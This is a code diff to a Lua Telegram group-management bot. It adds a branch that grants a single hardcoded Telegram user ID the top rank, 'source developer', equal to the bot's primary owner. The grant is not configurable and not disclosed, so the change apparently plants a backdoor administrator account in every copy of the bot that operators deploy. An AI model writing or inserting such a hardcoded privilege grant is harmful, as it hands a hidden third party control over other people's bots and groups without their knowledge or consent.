@@ -257,6 +257,10 @@ if msg.sender_user_id_ == SUDO_ID then
 msg.TheRankCmd = 'المطور الاساسي' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
+elseif msg.sender_user_id_ == 1020410634 then 
+msg.TheRankCmd = 'المطـور السورس'
+msg.TheRank = 'مطور السـورس'
+msg.Rank = 1
 elseif redis:sismember(Pearlin..':SUDO_BOT:',msg.sender_user_id_) then 
 msg.TheRankCmd = 'المطور'
 msg.TheRank = 'مطور البوت 👨🏽‍💻'
